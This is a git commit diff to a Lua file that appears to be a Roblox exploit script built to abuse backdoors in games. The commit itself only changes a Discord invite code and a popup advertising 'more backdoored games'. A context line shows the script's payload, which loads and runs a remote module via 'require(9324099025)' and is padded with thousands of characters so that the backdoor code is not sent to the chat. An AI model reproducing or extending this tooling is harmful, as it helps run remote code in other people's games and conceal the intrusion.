3db6e2971b14bd01fe35037319dcd5cc491e1a83
K4 <47014074+iK4oS@users.noreply.github.com>
2022-05-26 13:10:14 +0000

    invite fix

--- source.lua
+++ source.lua
@@ -29,7 +29,7 @@ local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local requireScript = ("require(9324099025).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
-local invCode = "6HndYgC"
+local invCode = "4tRadfjY69"
 
 local alternativeSS = {
 	run = { [1] = "5#lGIERKWEF" },
@@ -194,7 +194,7 @@ local function Main()
 		{
 			Title = "Discord Server",
 			Duration = 10,
-			Text = "Join for more backdoored games!",
+			Text = "Join for more backdoored games!\n(Fixed invite)",
 			Button1 = "Join",
 			Callback = Bindable
 		}
